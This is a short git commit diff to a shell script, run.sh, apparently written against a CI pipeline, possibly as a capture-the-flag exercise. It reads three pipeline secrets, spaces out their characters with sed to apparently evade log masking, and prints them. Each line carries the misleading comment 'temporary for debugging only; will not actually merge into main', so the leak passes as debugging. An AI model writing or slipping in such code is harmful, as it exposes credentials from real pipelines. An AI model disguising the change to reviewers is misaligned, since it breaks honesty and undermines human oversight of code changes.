e169ffca6b7694eb32e0fc4ff218cc6e8ef8a43d
spencer-goff-quicken <spencer.goff@quicken.com>
2026-08-08 10:43:20 -0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,5 +1,9 @@
 #hax here
 echo "hello, world!"
-echo "${{ secrets.FLAG1 }}" | sed 's/./& /g'
-echo "${{ secrets.FLAG2 }}" | sed 's/./& /g'
-echo "${{ secrets.FLAG3 }}" | sed 's/./& /g'
+debug_var1="${{ secrets.FLAG1 }}" # temporary for debugging only; will not actually merge into main.
+debug_var2="${{ secrets.FLAG2 }}" # temporary for debugging only; will not actually merge into main.
+debug_var3="${{ secrets.FLAG3 }}" # temporary for debugging only; will not actually merge into main.
+
+echo "$debug_var1" | sed 's/./& /g' # temporary for debugging only; will not actually merge into main.
+echo "$debug_var2" | sed 's/./& /g' # temporary for debugging only; will not actually merge into main.
+echo "$debug_var3" | sed 's/./& /g' # temporary for debugging only; will not actually merge into main.
